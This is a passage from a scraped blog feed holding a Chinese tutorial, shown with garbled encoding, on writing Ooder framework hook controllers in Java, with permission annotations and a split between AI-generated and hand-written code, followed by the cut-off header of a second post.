    <span class="hljs-keyword">private</span> String userName;
    <span class="hljs-keyword">private</span> String phone;
    <span class="hljs-keyword">private</span> String password;
    <span class="hljs-keyword">private</span> String roleId;
}
</code></pre>
<h3 data-id="heading-3">2.2 å®Œæ•´é’©å­æ§åˆ¶å™¨å®ç°</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Controller</span>
<span class="hljs-meta">@RequestMapping("/dsm/user/")</span>
<span class="hljs-meta">@AggregationAnnotation(rootClass = UserAggregate.class)</span> <span class="hljs-comment">// AI ç”Ÿæˆï¼šDSM èšåˆæ ¹å…³è”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserHookController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseHookController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService; <span class="hljs-comment">// AI ç”Ÿæˆï¼šæœåŠ¡ä¾èµ–æ³¨å…¥</span>

    <span class="hljs-comment">// ======================= é’©å­1ï¼šç”¨æˆ·åˆ—è¡¨æŸ¥è¯¢ï¼ˆè¡¨æ ¼è§†å›¾ï¼‰=======================</span>
    <span class="hljs-comment">/**
     * AI ç”Ÿæˆæ ¸å¿ƒå†…å®¹ï¼š
     * 1. é’©å­æ³¨è§£é…ç½®ï¼ˆ<span class="hljs-doctag">@HookMapping</span>ã€<span class="hljs-doctag">@GridViewAnnotation</span> ç­‰ï¼‰
     * 2. æ–¹æ³•ç­¾åã€å‚æ•°æ¥æ”¶ä¸é»˜è®¤å€¼è®¾ç½®
     * 3. åŸºç¡€æ—¥å¿—æ¨¡æ¿ä¸è¿”å›ç»“æ„æ¡†æ¶
     * 4. DSM é¢†åŸŸæ¨¡å‹å…³è”æ³¨è§£
     */</span>
    <span class="hljs-meta">@HookMapping("UserList")</span> <span class="hljs-comment">// é’©å­å”¯ä¸€æ ‡è¯†ï¼Œä¸å‰ç«¯è§†å›¾ç»‘å®š</span>
    <span class="hljs-meta">@GridViewAnnotation(
        pageSize = 10,
        sortable = true,
        checkbox = true,
        exportable = true
    )</span>
    <span class="hljs-meta">@APIEventAnnotation(autoRun = true)</span>
    <span class="hljs-meta">@ValidatePermissionAnnotation(permissions = {"USER_VIEW"})</span> <span class="hljs-comment">// äººå·¥è¡¥å……ï¼šOoder æƒé™æ³¨è§£</span>
    <span class="hljs-keyword">public</span> ListResultModel&lt;List&lt;UserListItem&gt;&gt; <span class="hljs-title function_">getUserList</span><span class="hljs-params">(
            <span class="hljs-meta">@RequestParam(defaultValue = "1")</span> <span class="hljs-type">int</span> page,
            <span class="hljs-meta">@RequestParam(defaultValue = "10")</span> <span class="hljs-type">int</span> pageSize,
            <span class="hljs-meta">@RequestParam(required = false)</span> String userName,
            <span class="hljs-meta">@RequestParam(required = false)</span> String status)</span> {

        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        log.debug(<span class="hljs-string">"å¼€å§‹æ‰§è¡Œç”¨æˆ·åˆ—è¡¨æŸ¥è¯¢é’©å­ï¼Œå‚æ•°ï¼špage={}, pageSize={}, userName={}, status={}"</span>,
                page, pageSize, userName, status); <span class="hljs-comment">// AI ç”Ÿæˆï¼šæ ‡å‡†åŒ–æ—¥å¿—æ¨¡æ¿</span>

        ListResultModel&lt;List&lt;UserListItem&gt;&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListResultModel</span>&lt;&gt;();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ======================= äººå·¥è¡¥å……æ ¸å¿ƒå†…å®¹ =======================</span>
            <span class="hljs-comment">// 1. æƒé™æ ¡éªŒå¢å¼ºï¼ˆå¯é€‰ï¼Œé…åˆæ³¨è§£å®ç°åŒé‡æ ¡éªŒï¼‰</span>
            <span class="hljs-comment">// åŸºäº Ooder æƒé™æ¡†æ¶ï¼Œé€šè¿‡ PermissionContext è·å–å½“å‰ç”¨æˆ·æƒé™</span>
            <span class="hljs-keyword">if</span> (!PermissionContext.getCurrentUserPermissions().contains(<span class="hljs-string">"USER_VIEW"</span>)) {
                <span class="hljs-keyword">return</span> createFailResult(<span class="hljs-string">"æ— æƒé™æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨ï¼Œè”ç³»ç®¡ç†å‘˜å¼€é€šæƒé™"</span>);
            }

            <span class="hljs-comment">// 2. ä¸šåŠ¡æŸ¥è¯¢é€»è¾‘ï¼ˆAI æ— æ³•ç”Ÿæˆå…·ä½“ SQL/ORM å®ç°ï¼‰</span>
            PageInfo&lt;UserDO&gt; userPage = userService.queryUserPage(page, pageSize, userName, status);
            <span class="hljs-keyword">if</span> (userPage == <span class="hljs-literal">null</span> || userPage.getList().isEmpty()) {
                result.setData(Collections.emptyList());
                result.setTotal(<span class="hljs-number">0</span>);
                <span class="hljs-keyword">return</span> result;
            }

            <span class="hljs-comment">// 3. å¤æ‚æ•°æ®è½¬æ¢ï¼ˆçŠ¶æ€ç æ˜ å°„ã€å­—æ®µè„±æ•ç­‰ä¸šåŠ¡è§„åˆ™ï¼‰</span>
            List&lt;UserListItem&gt; dataList = userPage.getList().stream()
                    .map(userDO -&gt; {
                        <span class="hljs-type">UserListItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserListItem</span>();
                        BeanUtils.copyProperties(userDO, item);
                        <span class="hljs-comment">// äººå·¥è¡¥å……ï¼šçŠ¶æ€ç è½¬ä¸šåŠ¡æ–‡æœ¬ï¼ˆéœ€åŒ¹é…å‰ç«¯è§†å›¾å±•ç¤ºè§„åˆ™ï¼‰</span>
                        item.setStatusText(<span class="hljs-string">"0"</span>.equals(userDO.getStatus()) ? <span class="hljs-string">"æ­£å¸¸"</span> : <span class="hljs-string">"ç¦ç”¨"</span>);
                        <span class="hljs-keyword">return</span> item;
                    })
                    .collect(Collectors.toList());

            <span class="hljs-comment">// ======================= AI ç”Ÿæˆæ ¸å¿ƒå†…å®¹ =======================</span>
            result.setData(dataList);
            result.setTotal(userPage.getTotal());
            result.setPage(page);
            result.setPageSize(pageSize);
            result.setSuccess(<span class="hljs-literal">true</span>);

            log.info(<span class="hljs-string">"ç”¨æˆ·åˆ—è¡¨æŸ¥è¯¢é’©å­æ‰§è¡ŒæˆåŠŸï¼Œè€—æ—¶ï¼š{}msï¼Œè¿”å›æ•°æ®é‡ï¼š{}"</span>,
                    System.currentTimeMillis() - startTime, dataList.size());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"ç”¨æˆ·åˆ—è¡¨æŸ¥è¯¢é’©å­æ‰§è¡Œå¤±è´¥"</span>, e); <span class="hljs-comment">// AI ç”Ÿæˆï¼šæ ‡å‡†åŒ–å¼‚å¸¸æ—¥å¿—</span>
            result.setSuccess(<span class="hljs-literal">false</span>);
            result.setMessage(<span class="hljs-string">"æŸ¥è¯¢å¤±è´¥ï¼š"</span> + e.getMessage());
        }
        <span class="hljs-keyword">return</span> result;
    }

    <span class="hljs-comment">// ======================= é’©å­2ï¼šç”¨æˆ·ç¼–è¾‘è¡¨å•ï¼ˆè¡¨å•è§†å›¾ï¼‰=======================</span>
    <span class="hljs-comment">/**
     * AI ç”Ÿæˆæ ¸å¿ƒå†…å®¹ï¼š
     * 1. è¡¨å•è§†å›¾æ³¨è§£é…ç½®ï¼ˆå¸ƒå±€ã€å¼¹çª—å°ºå¯¸ã€äº‹ä»¶ç»‘å®šï¼‰
     * 2. æ–¹æ³•ç­¾åä¸åŸºç¡€è¿”å›ç»“æ„
     * 3. æ ‡å‡†åŒ–æ—¥å¿—æ¨¡æ¿
     */</span>
    <span class="hljs-meta">@HookMapping("UserEditForm")</span>
    <span class="hljs-meta">@FormViewAnnotation(
        layout = FormLayout.vertical,
        labelWidth = "100px"
    )</span>
    <span class="hljs-meta">@DialogAnnotation(width = "600px", height = "400px", caption = "ç¼–è¾‘ç”¨æˆ·")</span>
    <span class="hljs-meta">@APIEventAnnotation(
        bindMenu = CustomMenuItem.EDIT,
        callback = {CustomCallBack.RELOADPARENT, CustomCallBack.CLOSE}
    )</span>
    <span class="hljs-meta">@ValidatePermissionAnnotation(permissions = {"USER_EDIT"})</span> <span class="hljs-comment">// äººå·¥è¡¥å……ï¼šæƒé™æ§åˆ¶æ³¨è§£</span>
    <span class="hljs-keyword">public</span> ResultModel&lt;UserFormInfo&gt; <span class="hljs-title function_">getUserEditForm</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String userId)</span> {

        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        log.debug(<span class="hljs-string">"å¼€å§‹æ‰§è¡Œç”¨æˆ·ç¼–è¾‘è¡¨å•é’©å­ï¼Œå‚æ•°ï¼šuserId={}"</span>, userId); <span class="hljs-comment">// AI ç”Ÿæˆï¼šæ—¥å¿—æ¨¡æ¿</span>

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ======================= äººå·¥è¡¥å……æ ¸å¿ƒå†…å®¹ =======================</span>
            <span class="hljs-comment">// 1. æƒé™æ ¡éªŒï¼ˆåŸºäº Ooder æƒé™æ¡†æ¶ï¼Œæ”¯æŒå¤šæƒé™ç»„åˆï¼‰</span>
            <span class="hljs-keyword">if</span> (!PermissionContext.checkPermission(<span class="hljs-string">"USER_EDIT"</span>) &amp;&amp; !PermissionContext.checkPermission(<span class="hljs-string">"ADMIN_ALL"</span>)) {
                <span class="hljs-keyword">return</span> createFailResult(<span class="hljs-string">"æ— ç”¨æˆ·ç¼–è¾‘æƒé™"</span>);
            }

            <span class="hljs-comment">// 2. ä¸šåŠ¡æ ¡éªŒé€»è¾‘ï¼ˆç”¨æˆ·å­˜åœ¨æ€§æ ¡éªŒï¼‰</span>
            <span class="hljs-type">UserDO</span> <span class="hljs-variable">userDO</span> <span class="hljs-operator">=</span> userService.getUserById(userId);
            <span class="hljs-keyword">if</span> (userDO == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> createFailResult(<span class="hljs-string">"ç”¨æˆ·ä¸å­˜åœ¨æˆ–å·²è¢«åˆ é™¤"</span>);
            }

            <span class="hljs-comment">// 3. æ•°æ®è½¬æ¢ä¸å®‰å…¨å¤„ç†ï¼ˆæ•æ„Ÿå­—æ®µè„±æ•ï¼‰</span>
            <span class="hljs-type">UserFormInfo</span> <span class="hljs-variable">formData</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserFormInfo</span>();
            BeanUtils.copyProperties(userDO, formData);
            formData.setPassword(<span class="hljs-literal">null</span>); <span class="hljs-comment">// äººå·¥è¡¥å……ï¼šå¯†ç å­—æ®µè„±æ•ï¼Œä¸è¿”å›å‰ç«¯</span>
            formData.setRoleId(<span class="hljs-string">"DEFAULT_USER"</span>); <span class="hljs-comment">// äººå·¥è¡¥å……ï¼šé»˜è®¤è§’è‰²èµ‹å€¼ï¼ˆä¸šåŠ¡è§„åˆ™ï¼‰</span>

            <span class="hljs-comment">// ======================= AI ç”Ÿæˆæ ¸å¿ƒå†…å®¹ =======================</span>
            <span class="hljs-keyword">return</span> createSuccessResult(formData);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"ç”¨æˆ·ç¼–è¾‘è¡¨å•é’©å­æ‰§è¡Œå¤±è´¥"</span>, e);
            <span class="hljs-keyword">return</span> createFailResult(<span class="hljs-string">"æ•°æ®åŠ è½½å¤±è´¥ï¼š"</span> + e.getMessage());
        }
    }
}
</code></pre>
<h3 data-id="heading-4">2.3 Ooder æƒé™æ¡†æ¶æ ¸å¿ƒè¡¥å……å®ç°</h3>
<p>Ooder æƒé™æ¡†æ¶åŸºäºâ€œæ³¨è§£+AOPâ€å®ç°ç»†ç²’åº¦æ§åˆ¶ï¼Œæ”¯æŒé’©å­çº§åˆ«çš„æƒé™æ ¡éªŒã€‚ä»¥ä¸‹æ˜¯æƒé™æ¡†æ¶çš„æ ¸å¿ƒä¾èµ–ä»£ç ï¼ˆéœ€äººå·¥é›†æˆåˆ°é¡¹ç›®ä¸­ï¼‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// äººå·¥è¡¥å……ï¼šOoder æƒé™æ³¨è§£å®šä¹‰ï¼ˆæ¡†æ¶è‡ªå¸¦ï¼Œéœ€å¯¼å…¥ï¼‰</span>
<span class="hljs-meta">@Target(ElementType.METHOD)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> ValidatePermissionAnnotation {
    String[] permissions(); <span class="hljs-comment">// æ‰€éœ€æƒé™é›†åˆ</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">ignore</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// æ˜¯å¦å¿½ç•¥æƒé™æ ¡éªŒ</span>
}

<span class="hljs-comment">// äººå·¥è¡¥å……ï¼šOoder æƒé™ä¸Šä¸‹æ–‡å·¥å…·ç±»ï¼ˆæ¡†æ¶æä¾›ï¼Œç›´æ¥ä½¿ç”¨ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PermissionContext</span> {
    <span class="hljs-comment">// è·å–å½“å‰ç”¨æˆ·æ‹¥æœ‰çš„æ‰€æœ‰æƒé™</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Set&lt;String&gt; <span class="hljs-title function_">getCurrentUserPermissions</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ¡†æ¶å†…éƒ¨å®ç°ï¼šä»ä¸Šä¸‹æ–‡è·å–ç”¨æˆ·è§’è‰²ï¼Œå…³è”æƒé™åˆ—è¡¨</span>
        <span class="hljs-keyword">return</span> SecurityContextHolder.getContext().getAuthentication().getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .collect(Collectors.toSet());
    }

    <span class="hljs-comment">// æ ¡éªŒå•ä¸ªæƒé™</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkPermission</span><span class="hljs-params">(String permission)</span> {
        <span class="hljs-keyword">return</span> getCurrentUserPermissions().contains(permission);
    }
}

<span class="hljs-comment">// äººå·¥è¡¥å……ï¼šæƒé™åˆ‡é¢ï¼ˆOoder æ¡†æ¶é»˜è®¤é›†æˆï¼Œæ— éœ€æ‰‹åŠ¨ç¼–å†™ï¼‰</span>
<span class="hljs-meta">@Aspect</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PermissionAspect</span> {
    <span class="hljs-meta">@Before("@annotation(validatePermission)")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPermissionCheck</span><span class="hljs-params">(JoinPoint joinPoint, ValidatePermissionAnnotation validatePermission)</span> {
        <span class="hljs-keyword">if</span> (validatePermission.ignore()) <span class="hljs-keyword">return</span>;
        Set&lt;String&gt; userPermissions = PermissionContext.getCurrentUserPermissions();
        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasPermission</span> <span class="hljs-operator">=</span> Arrays.stream(validatePermission.permissions())
                .anyMatch(userPermissions::contains);
        <span class="hljs-keyword">if</span> (!hasPermission) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HookException</span>(<span class="hljs-string">"æ— æƒé™æ‰§è¡Œè¯¥æ“ä½œ"</span>);
        }
    }
}
</code></pre>
<h2 data-id="heading-5">ä¸‰ã€å…³é”®è§£æï¼šAI ç”Ÿæˆ vs äººå·¥è¡¥å……è¾¹ç•Œ</h2>
<h3 data-id="heading-6">3.1 AI è¾…åŠ©ç”Ÿæˆçš„è‡ªåŠ¨åŒ–ä»£ç </h3>
<ul>
<li><strong>æ³¨è§£é…ç½®</strong>ï¼šåŒ…æ‹¬è§†å›¾æ³¨è§£ï¼ˆ@GridViewAnnotationã€@FormViewAnnotationï¼‰ã€äº‹ä»¶æ³¨è§£ï¼ˆ@APIEventAnnotationï¼‰ã€DSM å…³è”æ³¨è§£ï¼ˆ@AggregationAnnotationï¼‰ç­‰ï¼ŒAI å¯æ ¹æ®ä¸šåŠ¡åœºæ™¯è‡ªåŠ¨ç”Ÿæˆé€‚é…é…ç½®ã€‚</li>
<li><strong>æ–¹æ³•éª¨æ¶</strong>ï¼šæ–¹æ³•ç­¾åã€å‚æ•°æ¥æ”¶ä¸é»˜è®¤å€¼ã€è¿”å›ç»“æ„ï¼ˆResultModel/ListResultModelï¼‰ç­‰æ ‡å‡†åŒ–æ¨¡æ¿ã€‚</li>
<li><strong>æ—¥å¿—æ¨¡æ¿</strong>ï¼šæ–¹æ³•æ‰§è¡Œå‰åçš„æ—¥å¿—æ‰“å°ï¼ŒåŒ…å«å‚æ•°ã€è€—æ—¶ã€ç»“æœçŠ¶æ€ç­‰å…³é”®ä¿¡æ¯ã€‚</li>
<li><strong>ä¾èµ–æ³¨å…¥</strong>ï¼šæœåŠ¡å±‚ï¼ˆå¦‚ UserServiceï¼‰çš„ @Autowired æ³¨å…¥ä»£ç ã€‚</li>
<li><strong>åŸºç¡€æ•°æ®è½¬æ¢</strong>ï¼šç®€å•çš„ BeanUtils.copyProperties å­—æ®µæ˜ å°„ã€‚</li>
</ul>
<h3 data-id="heading-7">3.2 å¼€å‘äººå‘˜å¿…é¡»è¡¥å……çš„ä»£ç </h3>
<ul>
<li><strong>æƒé™æ ¡éªŒé€»è¾‘</strong>ï¼šåŸºäº Ooder æƒé™æ¡†æ¶çš„ç»†ç²’åº¦æƒé™æ§åˆ¶ï¼ŒåŒ…æ‹¬æ³¨è§£é…ç½®ä¸æ‰‹åŠ¨æ ¡éªŒå¢å¼ºã€‚</li>
<li><strong>æ ¸å¿ƒä¸šåŠ¡é€»è¾‘</strong>ï¼šæœåŠ¡å±‚æ–¹æ³•çš„å…·ä½“è°ƒç”¨ï¼ˆå¦‚ userService.queryUserPageï¼‰ï¼ŒAI æ— æ³•ç”Ÿæˆä¸ä¸šåŠ¡å¼ºç›¸å…³çš„æŸ¥è¯¢é€»è¾‘ã€‚</li>
<li><strong>å¤æ‚æ•°æ®è½¬æ¢</strong>ï¼šçŠ¶æ€ç æ˜ å°„ã€æ•æ„Ÿå­—æ®µè„±æ•ã€æšä¸¾è½¬æ¢ç­‰éœ€éµå¾ªä¸šåŠ¡è§„åˆ™çš„è½¬æ¢é€»è¾‘ã€‚</li>
<li><strong>ä¸šåŠ¡æ ¡éªŒ</strong>ï¼šç”¨æˆ·å­˜åœ¨æ€§æ ¡éªŒã€æ•°æ®åˆæ³•æ€§æ ¡éªŒç­‰åœºæ™¯åŒ–æ ¡éªŒé€»è¾‘ã€‚</li>
<li><strong>å¼‚å¸¸å¤„ç†å¢å¼º</strong>ï¼šé’ˆå¯¹ç‰¹å®šä¸šåŠ¡å¼‚å¸¸çš„ä¸ªæ€§åŒ–æç¤ºä¸å¤„ç†ã€‚</li>
</ul>
<h2 data-id="heading-8">å››ã€æœ€ä½³å®è·µæ€»ç»“</h2>
<ol>
<li><strong>æ³¨è§£é©±åŠ¨ä¼˜å…ˆ</strong>ï¼šå……åˆ†åˆ©ç”¨ Ooder æ³¨è§£ä½“ç³»ï¼Œå‡å°‘ XML é…ç½®ï¼ŒAI å¯è‡ªåŠ¨ç”Ÿæˆæ ‡å‡†åŒ–æ³¨è§£ï¼Œå¼€å‘è€…ä»…éœ€è°ƒæ•´å…³é”®å‚æ•°ã€‚</li>
<li><strong>æƒé™æ§åˆ¶æ ‡å‡†åŒ–</strong>ï¼šé€šè¿‡ @ValidatePermissionAnnotation æ³¨è§£å®ç°é’©å­çº§æƒé™æ§åˆ¶ï¼Œé…åˆ PermissionContext å·¥å…·ç±»å®Œæˆå¤æ‚æƒé™æ ¡éªŒï¼Œç¡®ä¿ä¼ä¸šçº§å®‰å…¨éœ€æ±‚ã€‚</li>
<li><strong>äººæœºååŒé«˜æ•ˆå¼€å‘</strong>ï¼šAI è´Ÿè´£æ ‡å‡†åŒ–æ¨¡æ¿ä»£ç ï¼Œå¼€å‘è€…èšç„¦ä¸šåŠ¡æ ¸å¿ƒï¼Œä»£ç é‡è¾ƒä¼ ç»Ÿå¼€å‘å‡å°‘ 60% ä»¥ä¸Šã€‚</li>
<li><strong>æ•°æ®è½¬æ¢è§„èŒƒåŒ–</strong>ï¼šåŸºäº @DataMapping æ³¨è§£å®ç°å‰åç«¯å­—æ®µè‡ªåŠ¨æ˜ å°„ï¼Œå¤æ‚è½¬æ¢é€»è¾‘å•ç‹¬å°è£…ï¼Œæå‡ä»£ç å¯ç»´æŠ¤æ€§ã€‚</li>
<li><strong>æ—¥å¿—ä¸ç›‘æ§</strong>ï¼šå¤ç”¨ AI ç”Ÿæˆçš„æ ‡å‡†åŒ–æ—¥å¿—æ¨¡æ¿ï¼Œé…åˆ Ooder å†…ç½®ç›‘æ§ä½“ç³»ï¼Œå®ç°é’©å­æ‰§è¡ŒçŠ¶æ€çš„å¯è§‚æµ‹æ€§ã€‚</li>
</ol>
<h2 data-id="heading-9">äº”ã€ç»“è¯­</h2>
<p>Ooder é’©å­æœºåˆ¶é€šè¿‡â€œAI ç”Ÿæˆæ ‡å‡†åŒ–ä»£ç +äººå·¥è¡¥å……ä¸šåŠ¡é€»è¾‘â€çš„ååŒæ¨¡å¼ï¼Œå®Œç¾è§£å†³äº†ä¼ä¸šçº§åº”ç”¨å¼€å‘ä¸­â€œæ•ˆç‡ä¸çµæ´»â€çš„å¹³è¡¡é—®é¢˜ã€‚å€ŸåŠ©æ³¨è§£é©±åŠ¨ä¸ DSM é¢†åŸŸå»ºæ¨¡ï¼Œé’©å­ä¸ä»…å®ç°äº†å‰åç«¯è§£è€¦ï¼Œæ›´é€šè¿‡åŸç”Ÿæƒé™æ¡†æ¶ã€è·¨æ¨¡å—è°ƒç”¨ç­‰èƒ½åŠ›ï¼Œæ»¡è¶³äº†ä¼ä¸šçº§åº”ç”¨çš„æ ¸å¿ƒè¯‰æ±‚ã€‚</p>
<p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¼€å‘è€…åº”èšç„¦äºæƒé™æ§åˆ¶ã€ä¸šåŠ¡é€»è¾‘ã€æ•°æ®è½¬æ¢ç­‰åˆ›é€ æ€§å·¥ä½œï¼Œå°†é‡å¤çš„æ¨¡æ¿ä»£ç äº¤ç»™ AI ç”Ÿæˆï¼Œä»è€Œå¤§å¹…æå‡å¼€å‘æ•ˆç‡ï¼Œç¼©çŸ­é¡¹ç›®è¿­ä»£å‘¨æœŸã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æµå¼ç³»ç»Ÿï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589916567876698154</link>    <guid>https://juejin.cn/post/7589916567876698154</guid>    <pubDate>2026-01-02T03:35:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589916567876698154" data-draft-id="7590593682584191039" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æµå¼ç³»ç»Ÿï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-02T03:35:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‡ªç”±ç”Ÿé•¿2024"/> <meta itemprop="url" content="https://juejin.cn/user/1591748569862670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æµå¼ç³»ç»Ÿï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1591748569862670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‡ªç”±ç”Ÿé•¿2024
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T03:35:40.000Z" title="Fri Jan 02 2026 03:35:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 